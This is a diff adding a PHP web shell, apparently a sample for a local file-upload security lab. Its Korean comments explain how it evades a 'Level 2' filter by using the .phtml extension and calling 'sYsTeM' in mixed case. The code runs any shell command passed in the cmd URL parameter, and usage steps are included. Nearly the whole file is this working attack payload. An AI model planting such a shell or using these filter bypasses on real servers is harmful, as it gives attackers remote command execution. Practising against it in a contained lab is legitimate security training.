@@ -1,0 +1,25 @@
+<?php
+/**
+ * Level 2 우회 샘플 - .phtml 확장자 사용
+ *
+ * 우회 기법:
+ * - .php 확장자만 차단하므로 .phtml 사용
+ * - 많은 웹서버가 .phtml도 PHP로 실행
+ *
+ * 사용법:
+ * 1. 확장자를 .txt에서 .phtml로 변경
+ * 2. Level 2 선택 후 업로드
+ * 3. 브라우저에서 접근: http://localhost:8080/uploads/shell.phtml?cmd=ls
+ */
+
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    // Level 2는 소문자 system만 차단하므로 대소문자 혼용으로 우회
+    $func = 'sYsTeM';
+    $func($_GET['cmd']);
+    echo "</pre>";
+} else {
+    echo "Web Shell - Level 2 Bypass<br>";
+    echo "Usage: ?cmd=ls";
+}
+?>
